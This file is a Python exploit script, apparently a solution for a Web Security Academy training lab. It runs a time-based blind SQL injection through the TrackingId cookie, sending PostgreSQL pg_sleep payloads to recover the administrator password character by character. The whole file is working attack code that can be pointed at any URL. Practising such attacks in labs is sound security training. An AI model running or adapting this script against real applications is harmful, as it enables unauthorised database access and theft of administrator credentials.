import sys
import requests
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry



def get_admin_password(url, session):
    try:
        alphanumeric_characters = string.ascii_lowercase + string.digits
        password = ""
        print(f"(+) Enumerating Administrator password...")
        for i in range(1, 21):
            for j in alphanumeric_characters:
                payload = f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{j}') THEN pg_sleep(15) ELSE pg_sleep(0) END FROM users)--"
                response = session.get(url, cookies={'TrackingId': payload})
                if response.elapsed.total_seconds() > 15:
                    password += j
                    print("\r" + password, end="", flush=True)
                    break
                else:
                    print("\r" + password + j, end="", flush=True)

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-)Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
    get_admin_password(url, session)
    print()


if __name__ == "__main__":
    main()